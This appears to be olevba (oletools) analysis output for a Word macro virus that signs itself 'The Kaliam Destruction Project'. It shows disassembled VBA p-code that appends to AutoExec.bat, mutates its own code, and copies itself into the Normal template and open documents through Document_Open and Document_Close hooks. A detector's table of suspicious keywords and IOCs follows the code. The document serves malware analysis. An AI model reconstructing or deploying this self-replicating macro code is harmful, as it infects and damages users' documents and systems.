' 	LitStr 0x000F "C:\AutoExec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #144:
' 	Ld Rnd 
' 	LitDI4 0xC350 0x0000 
' 	Mul 
' 	FnInt 
' 	St a 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "Debug 9 2 "
' 	Ld a 
' 	Concat 
' 	LitStr 0x0001 "1"
' 	Concat 
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #147:
' Line #148:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd Variables 
' 	MemLd Count 
' 	For 
' Line #149:
' 	Ld x 
' 	Ld ThisDocument 
' 	ArgsMemLd Variables 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #150:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #151:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd Variables 
' 	MemLd Count 
' 	For 
' Line #152:
' 	Ld x 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	ArgsMemLd Variables 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #153:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #154:
' Line #155:
' 	StartWithExpr 
' 	Ld Carrier 
' 	With 
' Line #156:
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St UECode 
' Line #157:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0005 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #158:
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St VCCode 
' Line #159:
' 	Ld VCCode 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #160:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	For 
' Line #161:
' 	Ld VCCode 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld VCCode 
' 	Ld VCCode 
' 	FnLen 
' 	Ld i 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	St VCCode 
' 	EndIf 
' Line #162:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #163:
' 	LitStr 0x0000 ""
' 	St factor 
' Line #164:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0006 
' 	Add 
' 	For 
' Line #165:
' 	Ld factor 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St factor 
' Line #166:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	NextVar 
' Line #167:
' 	Ld factor 
' 	LitStr 0x0002 ": "
' 	Concat 
' 	St make_morph 
' Line #168:
' Line #169:
' 	Ld VirCode 
' 	Ld make_morph 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld VCCode 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St VirCode 
' Line #170:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0007 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld VirCode 
' 	Ld Rnd 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St VirCode 
' 	EndIf 
' Line #171:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #172:
' 	Ld UECode 
' 	Ld VirCode 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	St VirCode 
' Line #173:
' 	EndWith 
' Line #174:
' Line #175:
' 	LitStr 0x0005 "VCode"
' 	Ld VirCode 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0002 
' Line #176:
' Line #177:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ResetMe 
' Line #178:
' 	Ld ResetMe 
' 	LitDI2 0x0096 
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitStr 0x00D7 "If ShowVisualBasicEditor=True Then Exit sub: With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, Normal.ThisDocument.Variables(1).Value: End With: ThisDocument.Save"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ResetMe 
' Line #179:
' 	Ld ResetMe 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	St ResetMe 
' Line #180:
' Line #181:
' 	StartWithExpr 
' 	Ld ActCarrier 
' 	With 
' Line #182:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #183:
' 	LitDI2 0x0001 
' 	Ld ResetMe 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #184:
' 	EndWith 
' Line #185:
' Line #186:
' 	StartWithExpr 
' 	Ld NormCarrier 
' 	With 
' Line #187:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #188:
' 	LitDI2 0x0001 
' 	Ld ResetMe 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #189:
' 	EndWith 
' Line #190:
' Line #191:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #192:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #193:
' Line #194:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0007 
' 	Gt 
' 	IfBlock 
' Line #195:
' 	LitStr 0x001F "The Kaliam Destruction Project."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0025 "Programmed in Bergen (NORWAY). 05/99."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x002D "This is a research virus - DO NOT DISTRIBUTE."
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #196:
' 	EndIfBlock 
' Line #197:
' Line #198:
' 	Reparse 0x0039 "Set KDP-4 = ActiveDocument.VBProject.VBComponents.Item(1)"
' Line #199:
' 	Reparse 0x0039 "Set KDP-5 = NormalTemplate.VBProject.VBComponents.Item(1)"
' Line #200:
' 	Reparse 0x0024 "NTCL = KDP-5.CodeModule.CountOfLines"
' Line #201:
' 	Reparse 0x0024 "ADCL = KDP-4.CodeModule.CountOfLines"
' Line #202:
' 	LitDI2 0x0002 
' 	St BGN 
' Line #203:
' 	Reparse 0x001B "If KDP-4.Name <> "KDP" Then"
' Line #204:
' 	LineCont 0x0004 05 00 00 00
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ADCL 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #205:
' 	SetStmt 
' 	Ld KDP 
' 	LitDI2 0x0004 
' 	Sub 
' 	Set ToInfect 
' Line #206:
' 	Reparse 0x0012 "KDP-4.Name = "KDP""
' Line #207:
' 	LitVarSpecial (True)
' 	St DoAD 
' Line #208:
' 	EndIfBlock 
' Line #209:
' Line #210:
' 	Reparse 0x001B "If KDP-5.Name <> "KDP" Then"
' Line #211:
' 	LineCont 0x0004 00 00 F0 FF
' 	Reparse 0x0034 "If NTCL > 0 ThenKDP-5.CodeModule.DeleteLines 1, NTCL"
' Line #212:
' 	SetStmt 
' 	Ld KDP 
' 	LitDI2 0x0005 
' 	Sub 
' 	Set ToInfect 
' Line #213:
' 	Reparse 0x0012 "KDP-5.Name = "KDP""
' Line #214:
' 	LitVarSpecial (True)
' 	St DoNT 
' Line #215:
' 	EndIfBlock 
' Line #216:
' Line #217:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo Doom 
' 	EndIf 
' Line #218:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #219:
' 	Reparse 0x002A "Do While KDP-4.CodeModule.Lines(1, 1) = """
' Line #220:
' 	Reparse 0x001E "KDP-4.CodeModule.DeleteLines 1"
' Line #221:
' 	Loop 
' Line #222:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #223:
' 	Reparse 0x002D "Do While KDP-4.CodeModule.Lines(BGN, 1) <> """
' Line #224:
' 	Reparse 0x0043 "ToInfect.CodeModule.InsertLines BGN, KDP-4.CodeModule.Lines(BGN, 1)"
' Line #225:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #226:
' 	Loop 
' Line #227:
' 	EndIfBlock 
' Line #228:
' Line #229:
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #230:
' 	Reparse 0x002A "Do While KDP-5.CodeModule.Lines(1, 1) = """
' Line #231:
' 	Reparse 0x001E "KDP-5.CodeModule.DeleteLines 1"
' Line #232:
' 	Loop 
' Line #233:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #234:
' 	Reparse 0x002D "Do While KDP-5.CodeModule.Lines(BGN, 1) <> """
' Line #235:
' 	Reparse 0x0043 "ToInfect.CodeModule.InsertLines BGN, KDP-5.CodeModule.Lines(BGN, 1)"
' Line #236:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #237:
' 	Loop 
' Line #238:
' 	EndIfBlock 
' Line #239:
' Line #240:
' 	Label Doom 
' Line #241:
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #242:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #243:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #244:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #245:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001F "The Kaliam Destruction Project."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0025 "Programmed in Bergen (NORWAY). 05/99."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x002D "This is a research virus - DO NOT DISTRIBUTE."
' 	Concat 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	EndIf 
' Line #246:
' Line #247:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |FTP.exe             |Executable file name                         |
|IOC       |AutoExec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

